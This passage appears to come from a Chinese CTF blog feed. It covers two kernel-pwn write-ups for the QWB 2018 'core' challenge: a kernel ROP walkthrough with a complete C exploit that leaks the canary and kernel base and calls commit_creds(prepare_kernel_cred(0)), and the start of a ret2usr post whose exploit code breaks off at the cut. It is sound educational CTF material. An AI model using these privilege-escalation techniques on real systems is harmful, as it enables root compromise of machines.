"data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://cdn.jsdelivr.net/gh/SpaceDraG0n-1/images@main/img/20250807184939174.png" alt="image-20250714151027661"></p><p>core_write（）向全局变量 name 上写 ，所以我们通过 core_write 和 core_copy_func 函数就可以完成 ROPchain 到内核空间的拷贝和执行 。</p><h3 id="解题思路（来自ctfkiwi的总结）"><a href="#解题思路（来自ctfkiwi的总结）" class="headerlink" title="解题思路（来自ctfkiwi的总结）"></a>解题思路（来自ctfkiwi的总结）</h3><p>经过如上的分析，可以得出以下解题思路：</p><ol><li>通过 ioctl 设置 off，然后通过 core_read() 泄漏出 canary</li><li>通过 core_write() 向 name 写，构造 ropchain</li><li>通过 core_copy_func() 从 name 向局部变量上写，通过设置合理的长度和 canary 进行 rop</li><li>通过 rop 执行 <code>commit_creds(prepare_kernel_cred(NULL))</code> 进行提权</li><li>返回用户态，通过 system(“&#x2F;bin&#x2F;sh”) 等起 shell</li></ol><p>commit_creds（） 和 prepare_kernel_cred（）的地址之前说过可以通过init保存在&#x2F;tmp&#x2F;kallsyms的数据来进行读取，同时我们也可以根据其距离vmlinux的固定偏移来确定 gadgets 的地址 ，其实这里就和用户态linux的题目非常的相似了 。</p><p>我们先在qemu中查看这两个函数的地址 ：</p><p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://cdn.jsdelivr.net/gh/SpaceDraG0n-1/images@main/img/20250807184905516.png" alt="image-20250714154407515"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">/ $ cat /tmp/kallsyms | grep commit_creds</span><br><span class="line">ffffffff9e09c8e0 T commit_creds</span><br><span class="line">/ $ cat /tmp/kallsyms | grep prepare_kernel_cred</span><br><span class="line">ffffffff9e09cce0 T prepare_kernel_cred</span><br></pre></td></tr></table></figure><p>然后计算这两个函数在 vmlinux 的偏移 ：</p><p>写一个简单的check脚本：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">~/PWN/kernel/kernelROP/QWB2018-core/give_to_player                                 root@SpaceDraG0n 03:47:06 PM</span><br><span class="line">❯ cat check.py   </span><br><span class="line">from pwn import *</span><br><span class="line">elf = ELF(&#x27;./core/vmlinux&#x27;)</span><br><span class="line">print(&quot;commit_creds  &gt;&gt; &quot; + hex(elf.symbols[&#x27;commit_creds&#x27;]-0xffffffff81000000))</span><br><span class="line">print(&quot;prepare_kernel_cred  &gt;&gt;&quot; + hex(elf.symbols[&#x27;prepare_kernel_cred&#x27;]-0xffffffff81000000))</span><br></pre></td></tr></table></figure><p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://cdn.jsdelivr.net/gh/SpaceDraG0n-1/images@main/img/20250807184907302.png" alt="image-20250714154752358"></p><p>这样我们就可以把函数在 vmlinux 的偏移求出来了 </p><p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://cdn.jsdelivr.net/gh/SpaceDraG0n-1/images@main/img/20250807184908541.png" alt="image-20250714155737487"></p><p>然后我们就可以通过实际函数地址减去得到的偏移，然后就可以知道vmlinux基地址 <code>0xffffffff9e000000</code></p><p>当然我们这个vmlinux地址是会变的，但是我们之所以要求出来，是为了知道栈上其他地址对与vmlinux的固定偏移，知道了这个固定偏移我们就可以通过copy_to_user，把栈上的值减去偏移从而得到vmlinux_base</p><p>然后我们就去 vmlinux 里面找一些 gadget ，这里我们使用 ropper 进行一个提取 ，因为用 ROPgadget 进行提取会比较慢 。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ropper --file ./vmlinux --nocolor &gt; gadget_ropper.txt</span><br></pre></td></tr></table></figure><p>然后可以使用正则表达式寻找我们想要的gadget</p><p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://cdn.jsdelivr.net/gh/SpaceDraG0n-1/images@main/img/20250807184909915.png" alt="image-20250719231948241"></p><p>canary的值就是这个 ，然后因为我们赋值了0x40到buf，所以后面的数据也一同复制到了buf，所以我们可以得到core_base 以及 vmlinux_base ，至于固定偏移怎么求，我前面已经讲过了 。</p><p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://cdn.jsdelivr.net/gh/SpaceDraG0n-1/images@main/img/20250807184911309.png" alt="image-20250719232832809"></p><p>这里现在验证一下泄露有没有问题，发现没有问题我们就可以进行下一步 rop 的编写了 ，因为我们在内核空间是通过执行 <code>commit_creds(prepare_kernel_cred(NULL))</code> 来提权的，所以我们要准备一个比较特殊的gadget <code>mov rdi,rax;call rdx;</code></p><p>其实就是把<code>prepare_kernel_cred(0)</code> 的返回值放到rdi寄存器里面，然后调用<code>commit_creds</code>函数，但是这里不是直接调用 ，而是通过执行pop_rcx间接调用 ，rop构造如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">int i = 0;</span><br><span class="line">for(i=0;i&lt;10;i++)&#123;</span><br><span class="line">    rop[i] = canary;</span><br><span class="line">&#125;</span><br><span class="line">i = 10;</span><br><span class="line">rop[i++] = pop_rdi; </span><br><span class="line">rop[i++] = 0;</span><br><span class="line">rop[i++] = prepare_kernel_cred;</span><br><span class="line">rop[i++] = pop_rdx;</span><br><span class="line">rop[i++] = pop_rcx;</span><br><span class="line">rop[i++] = mov_rdi_rax_call_rdx;</span><br><span class="line">rop[i++] = commit_creds;</span><br><span class="line">rop[i++] = swapgs; //恢复用户GS寄存器</span><br><span class="line">rop[i++] = 0;</span><br><span class="line">rop[i++] = iretq;</span><br><span class="line">rop[i++] = (size_t)get_shell;</span><br><span class="line">rop[i++] = user_cs;</span><br><span class="line">rop[i++] = user_rflags;</span><br><span class="line">rop[i++] = user_sp;</span><br><span class="line">rop[i++] = user_ss;</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">↓   swapgs</span><br><span class="line">    iretq</span><br><span class="line">    user_shell_addr</span><br><span class="line">    user_cs</span><br><span class="line">    user_eflags //64bit user_rflags</span><br><span class="line">    user_sp</span><br><span class="line">    user_ss</span><br></pre></td></tr></table></figure><p>其实就是提权后构造以上的rop链 </p><p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://cdn.jsdelivr.net/gh/SpaceDraG0n-1/images@main/img/20250807184913903.png" alt="image-20250719235642606"></p><p>然后我们可以利用 core_write 函数，把我们构造出来的rop通过copy_from_user函数来复制到name变量里面去，这里的 core_write 函数可以直接调用，不需要我们通过 ioctl 间接调用：</p><p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://cdn.jsdelivr.net/gh/SpaceDraG0n-1/images@main/img/20250807184915592.png" alt="image-20250719235923415"></p><p>大概是因为 core_write 函数被定义到 core_fops 这个全局变量里面 ，所以我们可以直接进行调用 </p><p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://cdn.jsdelivr.net/gh/SpaceDraG0n-1/images@main/img/20250807184916645.png" alt="image-20250720000310012"></p><p>然后我们用数据类型引起的overflow，调用core_copy_func函数来布置rop栈溢出就可以实现内核提权了</p><p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://cdn.jsdelivr.net/gh/SpaceDraG0n-1/images@main/img/20250807184917985.png" alt="image-20250720002143694"></p><h3 id="EXP："><a href="#EXP：" class="headerlink" title="EXP："></a>EXP：</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br></pre></td><td class="code"><pre><span class="line">#include&lt;stdio.h&gt;</span><br><span class="line">#include&lt;unistd.h&gt;</span><br><span class="line">#include&lt;stdlib.h&gt;</span><br><span class="line">#include&lt;fcntl.h&gt;</span><br><span class="line">#include&lt;string.h&gt;</span><br><span class="line">#include&lt;sys/types.h&gt;</span><br><span class="line">#include&lt;sys/wait.h&gt;</span><br><span class="line">#include&lt;sys/ioctl.h&gt;</span><br><span class="line">#include&lt;pthread.h&gt;</span><br><span class="line">void setoff(int fd,long long size)&#123;</span><br><span class="line">    ioctl(fd,0x6677889c,size);</span><br><span class="line">&#125;</span><br><span class="line">void core_read(int fd,char *buf)&#123;</span><br><span class="line">    ioctl(fd,0x6677889b,buf);</span><br><span class="line">&#125;</span><br><span class="line">void core_copy_func(int fd,long long size)&#123;</span><br><span class="line">    ioctl(fd,0x6677889a,size);</span><br><span class="line">&#125;</span><br><span class="line">size_t user_cs, user_ss, user_rflags, user_sp;</span><br><span class="line"></span><br><span class="line">void save_status(void)</span><br><span class="line">&#123;</span><br><span class="line">    asm volatile (</span><br><span class="line">        &quot;mov user_cs, cs;&quot;</span><br><span class="line">        &quot;mov user_ss, ss;&quot;</span><br><span class="line">        &quot;mov user_sp, rsp;&quot;</span><br><span class="line">        &quot;pushf;&quot;</span><br><span class="line">        &quot;pop user_rflags;&quot;</span><br><span class="line">    );</span><br><span class="line"></span><br><span class="line">    puts(&quot;\033[34m\033[1m[*] Status has been saved.\033[0m&quot;);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">void get_shell()&#123;</span><br><span class="line">system(&quot;/bin/sh&quot;);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">int main()&#123;</span><br><span class="line">    int fd ;</span><br><span class="line">    size_t tmp;</span><br><span class="line">    char buf[0x50];</span><br><span class="line">    size_t rop[0x100];</span><br><span class="line">    size_t vmlinux_base,canary,core_base;</span><br><span class="line">    size_t commit_creds = 0x9c8e0;</span><br><span class="line">    size_t prepare_kernel_cred = 0x9cce0;</span><br><span class="line">    save_status();</span><br><span class="line">    fd = open(&quot;/proc/core&quot;,O_RDWR); //程序创造了一个接口，所以我们需要把这个接口给打开 ，这样才能进行函数调用</span><br><span class="line">    if(fd &lt; 0) &#123;</span><br><span class="line">        printf(&quot;Open /proc/core error!\n&quot;);</span><br><span class="line">        exit(0);</span><br><span class="line">    &#125;</span><br><span class="line">    setoff(fd,0x40); // v4 距离 canary 的偏移是 0x40 ，而且v5的数据类型是char类型。</span><br><span class="line">    core_read(fd,buf); //把canary读入用户态的buf </span><br><span class="line">    size_t pop_rdi = 0x000b2f;</span><br><span class="line">    size_t push_rax = 0x02d112;</span><br><span class="line">    size_t swapgs = 0x0d6;</span><br><span class="line">    size_t iretq ;</span><br><span class="line">    size_t xchg = 0x16684f0;</span><br><span class="line">    size_t call_rax = 0x40398;</span><br><span class="line">    size_t pop_rcx = 0x21e53;</span><br><span class="line">    size_t pop_rbp = 0x3c4;</span><br><span class="line">    size_t pop_rdx = 0xa0f49;</span><br><span class="line">    size_t mov_rdi_rax_call_rdx = 0x01aa6a;</span><br><span class="line">    //此时buf的前八个字节是我们的canary</span><br><span class="line">    canary = (*(size_t *)(&amp;buf[0]));</span><br><span class="line">    puts(&quot;\033[34m\033[1m[*] leak success! .\033[0m&quot;);</span><br><span class="line">    printf(&quot;\033[34m\033[1m[*] Canary  &gt;&gt; %p.\033[0m\n&quot;,canary);</span><br><span class="line">    core_base = (*(size_t *)(&amp;buf[2*8])) - 0x19b;</span><br><span class="line">    puts(&quot;\033[34m\033[1m[*] leak success! .\033[0m&quot;);</span><br><span class="line">    printf(&quot;\033[34m\033[1m[*] core_base  &gt;&gt; %p.\033[0m\n&quot;,core_base);</span><br><span class="line">    vmlinux_base = (*(size_t *)(&amp;buf[4*8]) - 0x1dd6d1);</span><br><span class="line">    puts(&quot;\033[34m\033[1m[*] leak success! .\033[0m&quot;);</span><br><span class="line">    printf(&quot;\033[34m\033[1m[*] vmlinux_base  &gt;&gt; %p.\033[0m\n&quot;,vmlinux_base);</span><br><span class="line">    pop_rdi += vmlinux_base;</span><br><span class="line">    pop_rcx += vmlinux_base;</span><br><span class="line">    pop_rbp += vmlinux_base;</span><br><span class="line">    pop_rdx += vmlinux_base;</span><br><span class="line">    mov_rdi_rax_call_rdx += vmlinux_base;</span><br><span class="line">    swapgs += core_base;</span><br><span class="line">    iretq = 0x50ac2 + vmlinux_base;</span><br><span class="line">    commit_creds += vmlinux_base;</span><br><span class="line">    prepare_kernel_cred += vmlinux_base;</span><br><span class="line">    int i = 0;</span><br><span class="line">    for(i=0;i&lt;10;i++)&#123;</span><br><span class="line">        rop[i] = canary;</span><br><span class="line">    &#125;</span><br><span class="line">    i = 10;</span><br><span class="line">    rop[i++] = pop_rdi; </span><br><span class="line">    rop[i++] = 0;</span><br><span class="line">    rop[i++] = prepare_kernel_cred;</span><br><span class="line">    rop[i++] = pop_rdx;</span><br><span class="line">    rop[i++] = pop_rcx;</span><br><span class="line">    rop[i++] = mov_rdi_rax_call_rdx;</span><br><span class="line">    rop[i++] = commit_creds;</span><br><span class="line">    rop[i++] = swapgs; //恢复用户GS寄存器</span><br><span class="line">    rop[i++] = 0;</span><br><span class="line">    rop[i++] = iretq;</span><br><span class="line">    rop[i++] = (size_t)get_shell;</span><br><span class="line">    rop[i++] = user_cs;</span><br><span class="line">    rop[i++] = user_rflags;</span><br><span class="line">    rop[i++] = user_sp;</span><br><span class="line">    rop[i++] = user_ss;</span><br><span class="line">    write(fd,rop,i*8);</span><br><span class="line">    core_copy_func(fd,0xf000000000000000+i*8);</span><br><span class="line">    puts(&quot;\033[34m\033[1m[*] Attack Success! .\033[0m&quot;);</span><br><span class="line">    return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="参考链接："><a href="#参考链接：" class="headerlink" title="参考链接："></a>参考链接：</h2><p><a href="https://ctf-wiki.org/pwn/linux/kernel-mode/exploitation/rop/rop/">https://ctf-wiki.org/pwn/linux/kernel-mode/exploitation/rop/rop/</a></p><p><a href="https://ret2p4nda.github.io/2018/07/13/ciscn2018-core/">https://ret2p4nda.github.io/2018/07/13/ciscn2018-core/</a></p><p><a href="https://www.z1r0.top/2021/10/22/kernel%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/#%E6%94%BB%E5%87%BB%E6%B5%81%E7%A8%8B">https://www.z1r0.top/2021/10/22/kernel%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/#%E6%94%BB%E5%87%BB%E6%B5%81%E7%A8%8B</a></p>]]></content>
      
      
      <categories>
          
          <category> 知识分享 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Kernel Pwn </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Kernel初识 - Kernel ret2usr</title>
      <link href="/posts/16113.html"/>
      <url>/posts/16113.html</url>
      
        <content type="html"><![CDATA[<h1 id="Kernel-ret2usr"><a href="#Kernel-ret2usr" class="headerlink" title="Kernel ret2usr"></a>Kernel ret2usr</h1><p>个人感觉这个手法有点类似于用户态的ret2shellcode，但又不完全相同</p><h2 id="概述"><a href="#概述" class="headerlink" title="概述"></a>概述</h2><p><strong>在【未】开启 SMAP&#x2F;SMEP 保护的情况下</strong>，用户空间无法访问内核空间的数据，但是内核空间可以访问 &#x2F; 执行用户空间的数据，因此 <code>ret2usr</code> 这种攻击手法应运而生——通过 kernel ROP 以内核的 ring 0 权限执行用户空间的代码以完成提权。</p><p>通常 CTF 中的 ret2usr 还是以执行 <code>commit_creds(prepare_kernel_cred(NULL))</code> 进行提权为主要的攻击手法，不过相比起构造冗长的 ROP chain，ret2usr 只需我们要提前在用户态程序构造好对应的函数指针、获取相应函数地址后直接 ret 回到用户空间执行即可，在这种情况下 <strong>我们只需要劫持内核执行流，而无需在内核空间构造复杂的 ROP 链条</strong> 。</p><p>✳ 对于开启了 <code>SMAP/SMEP保护</code> 的 kernel 而言，<strong>内核空间尝试直接访问用户空间会引起 kernel panic</strong>，我们将在下一章节讲述其绕过方式。</p><blockquote><p>在 QEMU 启动参数中，我们可以为 CPU 参数加上 <code>-smep,-smap</code> 以显式关闭 SMEP&amp;SMAP 保护，例如：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">#!/bin/sh</span><br><span class="line">qemu-system-x86_64 \</span><br><span class="line">    -enable-kvm \</span><br><span class="line">    -cpu host,-smep,-smap \</span><br><span class="line"># ...</span><br></pre></td></tr></table></figure></blockquote><h2 id="攻击代码"><a href="#攻击代码" class="headerlink" title="攻击代码"></a>攻击代码</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">void get_shell()&#123;</span><br><span class="line">system(&quot;/bin/sh&quot;);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">size_t prepare_kernel_cred , commit_creds;</span><br><span class="line">void* (*prepare_kernel_cred_kfunc)(void *task_struct);</span><br><span class="line">int (*commit_creds_kfunc)(void *cred);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">void privilege_escalation()&#123;</span><br><span class="line">    if(commit_creds &amp;&amp; prepare_kernel_cred)&#123;</span><br><span class="line">        (*((void (*)(char *))commit_creds))(</span><br><span class="line">            (*((char* (*)(int))prepare_kernel_cred))(0)</span><br><span class="line">        );</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="例题：强网杯-2018-core"><a href="#例题：强网杯-2018-core" class="headerlink" title="例题：强网杯 2018 - core"></a>例题：强网杯 2018 - core</h2><h3 id="Kernel-ret2usr-1"><a href="#Kernel-ret2usr-1" class="headerlink" title="Kernel ret2usr"></a>Kernel ret2usr</h3><p>直接贴exp了，只需要把直接内核提权的rop换成我们用户态构造好的提权函数地址即可，如果对前面的相关思路还没有了解的，可以去看我的之前的博客 ，Kernel ROP 。</p><h3 id="EXP："><a href="#EXP：" class="headerlink" title="EXP："></a>EXP：</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br></pre></td><td class="code"><pre><span class="line">#include&lt;stdio.h&gt;</span><br><span class="line">#include&lt;unistd.h&gt;</span><br><span class="line">#include&lt;stdlib.h&gt;</span><br><span class="line">#include&lt;fcntl.h&gt;</span><br><span class="line">#include&lt;string.h&gt;</span><br><span class="line">#include&lt;sys/types.h&gt;</span><br><span class="line">#include&lt;sys/wait.h&gt;</span><br><span class="line">#include&lt;sys/ioctl.h&gt;</span><br><span class="line">#include&lt;pthread.h&gt;</span><br><span class="line">void setoff(int fd,long long size)&#123;</span><br><span class="line">    ioctl(fd,0x6677889c,size);</span><br><span class="line">&#125;</span><br><span class="line">void core_read(int fd,char *buf)&#123;</span><br><span class="line">    ioctl(fd,0x6677889b,buf);</span><br><span class="line">&#125;</span><br><span class="line">void core_copy_func(int fd,long long size)&#123;</span><br><span class="line">    ioctl(fd,0x6677889a,size);</span><br><span class="line">&#125;</span><br><span class="line">size_t user_cs, user_ss, user_rflags, user_sp;</span><br><span class="line"></span><br><span class="line">void save_status(void)</span><br><span class="line">&#123;</span><br><span class="line">    asm volatile (</span><br><span class="line">        &quot;mov user_cs, cs;&quot;</span><br><span class="line">        &quot;mov user_ss, ss;&quot;</span><br><span class="line">        &quot;mov user_sp, rsp;&quot;</span><br><span class="line">        &quot;pushf;&quot;</span><br><span class="line">        &quot;pop user_rflags;&quot;</span><br><span class="line">    );</span><br><span class="line"></span><br><span class="line">    puts(&quot;\033[34m\033[1m[*] Status has been saved.\033[0m&quot;);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">void get_shell()&#123;</span><br><span class="line">system(&quot;/bin/sh&quot;);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">int fd ;</span><br><span class="line">size_t tmp;</span><br><span class="line">char buf[0x50];</span><br><span class="line">size_t rop[0x100];</span><br><span class="line">size_t vmlinux_base,canary,core_base;</span><br><span class="line">size_t commit_creds = 0x9c8e0;</span><br><span class="line">size_t prepare_kernel_cred = 0x9cce0;</span><br><span class="line">size_t pop_rdi = 0x000b2f;</span><br><span class="line">size_t push_rax = 0x02d112;</span><br><span class="line">size_t swapgs = 0x0d6;</span><br><span class="line">size_t iretq ;</span><br><span class="line">size_t xchg = 0x16684f0;</span><br><span class="line">size_t call_rax = 0x40398;</span><br><span class="line">size_t pop_rcx = 0x21e53;</span><br><span class="line">size_t pop_rbp = 0x3c4;</span><br><span class="line">size_t pop_rdx = 0xa0f49;</span><br><span class="line">size_t mov_rdi_rax_call_rdx = 0x01aa6a;</span><br><span class="line">int i = 0;</span><br><span class="line"></span><br><span class="line">void get_addr()&#123;</span><br><span class="line"></span><br><span class="line">    save_status();</span><br><span class="line">    fd = open(&quot;/proc/core&quot;,O_RDWR); //程序创造了一个接口，所以我们需要把这个接口给打开 ，这样才能进行函数调用</span><br><span class="line">    if(fd &lt; 0) &#123;</span><br><span class="line">        printf(&quot;Open /proc/core error!\n&quot;);</span><br><span class="line">        exit(0);</span><br><span class="line">    &#125;</span><br><span class="line">    setoff(fd,0x40); // v4 距离 canary 的偏移是 0x40 ，而且v5的数据类型是char类型。</span><br><span class="line">    core_read(fd,buf); //把canary读入用户态的buf </span><br><span class="line"></span><br><span class="line">    //此时buf的前八个字节是我们的canary</span><br><span class="line">    canary = (*(size_t *)(&amp;buf[0]));</span><br><span class="line">    puts(&quot;\033[34m\033[1m[*] leak success! .\033[0m&quot;);</span><br><span class="line">    printf(&quot;\033[34m\033[1m[*] Canary  &gt;&gt; %p.\033[0m\n&quot;,canary);</span><br><span class="line">    core_base = (*(size_t *)(&amp;buf[2*8])) - 0x19b;</span><br><span class="line">    puts(&quot;\033[34m\033[1m[*] leak success! .\033[0m&quot;);</span><br><span class="line">    printf(&quot;\033[34m\033[1m[*] core_base  &gt;&gt; %p.\033[0m\n&quot;,core_base);</span><br><span class="line">    vmlinux_base = (*(size_t *)(&amp;buf[4*8]) - 0x1dd6d1);</span><br><span class="line">    puts(&quot;\033[34m\033[1m[*] leak success! .\033[0m&quot;);</span><br><span class="line">    printf(&quot;\033[34m\033[1m[*] vmlinux_base  &gt;&gt; %p.\033[0m\n&quot;,vmlinux_base);</span><br><span class="line">    pop_rdi += vmlinux_base;</span><br><span class="line">    pop_rcx += vmlinux_base;</span><br><span class="line">    pop_rbp += vmlinux_base;</span><br><span class="line">    pop_rdx += vmlinux_base;</span><br><span class="line">    mov_rdi_rax_call_rdx += vmlinux_base;</span><br><span class="line">    